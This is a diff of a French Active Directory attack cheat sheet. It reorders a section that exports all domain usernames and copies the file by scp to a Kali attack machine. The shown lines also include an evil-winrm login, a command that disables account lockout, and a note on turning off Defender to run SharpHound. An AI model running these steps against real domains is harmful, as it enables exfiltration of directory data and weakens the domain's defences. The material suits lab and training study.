@@ -495,6 +495,21 @@ sudo evil-winrm -i 10.0.0.1 -u '<UserName>@<Domain-Name>' -p '<password>'
 ![img](img/evil.png)
 
 
+### Extraire une liste d'utilisateurs de l'AD
+```powershell
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName | Out-File -Encoding UTF8 C:\Users\Administrateur\Desktop\domusers.txt
+```
+
+### Tranférer la liste du DC vers la Kali
+```sh
+scp C:\Users\Administrateur\Desktop\domusers.txt totol@10.0.0.51:/home/toto/Bureau/
+```
+
+> [!IMPORTANT]
+> Ici je donne l'exemple d'une extraction de liste d'utilisateurs mais dans un autre contexte un attaquant pourrait aussi désactiver Defender et exécuter Sharpound (voir plus bas) puis tranférer le zip Sharpound vers sa machine d'attaque afin d'avoir une vision complète de l'AD bien qu'à ce stade l'Active Directory soit déjà entièrement compromis.
+
+---
+
 ### Voir la password policy
 ```powershell
 Get-ADDefaultDomainPasswordPolicy
@@ -511,17 +526,6 @@ Get-ADDefaultDomainPasswordPolicy
 ### Ne jamais bloquer le compte avec des faux mots de passe
 ```powershell
 Set-ADDefaultDomainPasswordPolicy -LockoutThreshold 0
-```
-
----
-
-### Extraire une liste d'utilisateurs de l'AD
-```powershell
-Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName | Out-File -Encoding UTF8 C:\Users\Administrateur\Desktop\domusers.txt
-```
-### Tranférer la liste du DC vers la Kali
-```sh
-scp C:\Users\Administrateur\Desktop\domusers.txt totol@10.0.0.51:/home/toto/Bureau/
 ```
 
 ---
